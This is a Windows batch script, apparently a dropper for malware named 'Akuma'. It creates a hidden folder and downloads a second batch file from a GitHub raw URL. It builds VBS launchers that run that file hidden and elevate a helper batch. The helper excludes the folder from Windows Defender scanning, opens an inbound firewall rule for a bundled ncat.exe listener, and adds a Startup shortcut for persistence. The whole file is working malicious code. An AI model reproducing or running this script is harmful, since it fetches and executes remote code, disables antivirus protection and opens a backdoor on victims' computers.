@echo off
mkdir %homedrive%\Akuma
attrib +h %homedrive%\Akuma
cd %temp%
curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\誕生日.vbs
echo objShell.Run "%temp%\Akuma.bat", 0, False >> %homedrive%\Akuma\誕生日.vbs
echo Set objShell = CreateObject("Shell.Application") >> %homedrive%\Akuma\beyondbirthday.vbs
echo objShell.ShellExecute "%homedrive%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %homedrive%\Akuma\beyondbirthday.vbs
echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Akuma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "Akuma" -Direction Inbound -Program "%homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
echo start %homedrive%\Akuma\誕生日.vbs >> %homedrive%\Akuma\beyondbirthday.bat
echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
echo del "beyondbirthday.lnk" >> %homedrive%\Akuma\beyondbirthday.bat
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
set "vbsFilePath=%homedrive%\Akuma\beyondbirthday.vbs"
IF EXIST "%vbsFilePath%" (
    cscript "%vbsFilePath%"
) ELSE (
    echo The specified VBScript file does not exist.
    rem Add error handling or other actions here
)
exit